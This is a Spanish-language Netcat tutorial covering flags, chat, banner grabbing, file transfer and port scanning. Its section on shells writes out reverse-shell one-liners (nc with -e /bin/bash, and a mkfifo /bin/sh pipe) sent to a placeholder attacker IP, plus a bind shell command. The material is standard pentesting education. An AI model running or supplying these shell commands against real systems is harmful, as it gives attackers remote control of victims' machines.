Netcat (comúnmente ejecutado como `nc`) es conocido como la **"navaja suiza de los protocolos TCP/IP"**. Su función principal es leer y escribir datos a través de conexiones de red.
## 1. Flags Fundamentales (La Anatomía de Netcat)
Para dominar el uso de Netcat, es fundamental comprender sus banderas principales. En auditorías y administraciones de sistemas, estas banderas suelen combinarse frecuentemente como `-lvnp`.

| **Flag** | **Significado** | **Descripción Técnica**                                                                                                                                                                                  |
| -------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-l`     | **L**isten      | Modo servidor. Indica a Netcat que permanezca "escuchando" en un puerto a la espera de una conexión entrante.                                                                                            |
| `-v`     | **V**erbose     | Modo detallado. Imprime en pantalla cuando un equipo se conecta o si se producen errores (el uso de `-vv` proporciona mayor nivel de detalle).                                                           |
| `-n`     | **N**umeric     | Omite la resolución de nombres DNS. Opera exclusivamente con direcciones IP puras, lo que acelera significativamente el establecimiento de la conexión.                                                  |
| `-p`     | **P**ort        | Especifica el número de puerto local que la herramienta va a utilizar.                                                                                                                                   |
| `-u`     | **U**DP         | Cambia el protocolo de transporte de TCP (predeterminado) a UDP.                                                                                                                                         |
| `-e`     | **E**xecute     | Ejecuta un programa específico al establecerse la conexión (por ejemplo, `/bin/bash`). _Nota: Por motivos de seguridad, muchas distribuciones modernas de Linux compilan Netcat omitiendo esta bandera._ |
| `-z`     | **Z**ero-I/O    | Modo escáner. Establece la conexión con el puerto y se desconecta de inmediato sin enviar ni recibir datos útiles.                                                                                       |
| `-w`     | **W**ait        | Define un tiempo máximo de espera (timeout) expresado en segundos.                                                                                                                                       |
## 2. Casos de Uso: Operaciones Básicas
### Chat Simple (Cliente - Servidor)
Se puede utilizar Netcat para establecer una vía de comunicación rudimentaria (chat) en texto plano entre dos sistemas.
```
# Máquina A (Servidor a la escucha)
nc -lvnp 4444

# Máquina B (Cliente que inicia la conexión hacia la Máquina A)
nc <IP_MAQUINA_A> 4444
```
### Banner Grabbing e Interacción Manual
Resulta de gran utilidad para interrogar servicios (como servidores web o de correo) y extraer sus versiones de manera manual.
```
# Conexión al puerto 80 (HTTP) para enviar una petición manual
nc -vn <IP_OBJETIVO> 80
> GET / HTTP/1.1
> 

# Conexión a un puerto de correo (SMTP) para identificar el software subyacente
nc -vn <IP_OBJETIVO> 25
```
## 3. Transferencia de Archivos
El uso de FTP, SCP o Samba no es estrictamente necesario si se dispone de Netcat. La regla general para la transferencia es: **el equipo receptor utiliza `>` (escribe en el disco), mientras que el equipo emisor utiliza `<` (lee desde el disco).**
### Opción A: El Receptor escucha (Pushing from Client)
```
# 1. El RECEPTOR (Máquina A) abre un puerto y redirige el flujo de entrada al archivo:
nc -lvnp 4444 > archivo_recibido.zip

# 2. El EMISOR (Máquina B) se conecta y transmite el archivo:
nc <IP_MAQUINA_A> 4444 < archivo_original.zip
```
### Opción B: El Emisor escucha (Pulling from Listener)
```
# 1. El EMISOR (Máquina A) abre un puerto y ofrece el archivo:
nc -lvnp 4444 < archivo_original.zip

# 2. El RECEPTOR (Máquina B) se conecta y descarga el archivo:
nc <IP_MAQUINA_A> 4444 > archivo_recibido.zip
```
## 4. Shells: Reverse y Bind
En el ámbito del _Pentesting_ y la ciberseguridad, Netcat destaca en la creación de accesos remotos.
### Reverse Shell (El objetivo inicia la conexión)
El atacante se pone a la escucha; la máquina víctima se conecta a él y le entrega el control de su terminal. Es el método más fiable para evadir cortafuegos.
```
# 1. ATACANTE (Abre el puerto en su propia máquina a la espera):
nc -lvnp 9443

# 2. VÍCTIMA (El sistema comprometido ejecuta el comando para conectarse al atacante):
# Variante A: Si la víctima posee una versión clásica de Netcat (GNU con flag -e):
nc <IP_ATACANTE> 9443 -e /bin/bash

# Variante B: Si la víctima carece de la flag -e (versión OpenBSD, estándar actual):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_ATACANTE> 9443 >/tmp/f
```
### Bind Shell (El atacante inicia la conexión)
La máquina víctima abre un puerto local y "ata" su terminal a dicho puerto. Posteriormente, el atacante se conecta como cliente. _(Este método suele fracasar en entornos de producción modernos debido a las políticas restrictivas de los firewalls contra conexiones entrantes)._
```
# 1. VÍCTIMA (Abre un puerto y expone su terminal):
nc -lvnp 4444 -e /bin/bash

# 2. ATACANTE (Se conecta al puerto expuesto por la víctima):
nc <IP_VICTIMA> 4444
```
## 5. Escaneo de Puertos de Emergencia
Si un auditor o administrador de sistemas se encuentra en un entorno donde no dispone de herramientas dedicadas como `nmap`, Netcat ofrece una alternativa viable para verificar el estado de los puertos.
```
# Escanear un rango de puertos (20 al 25) y el puerto 80 (con un timeout de 1 segundo)
nc -nvz -w 1 <IP_OBJETIVO> 20-25 80
```

> **Nota técnica:** Se recomienda de manera estricta incluir la bandera `-n` (numeric) durante las operaciones de auditoría. Si Netcat intenta resolver mediante DNS la IP de un objetivo bloqueado o inexistente, el proceso sufrirá un retraso de varios segundos, lo que puede generar la falsa percepción de que el comando ha fallado.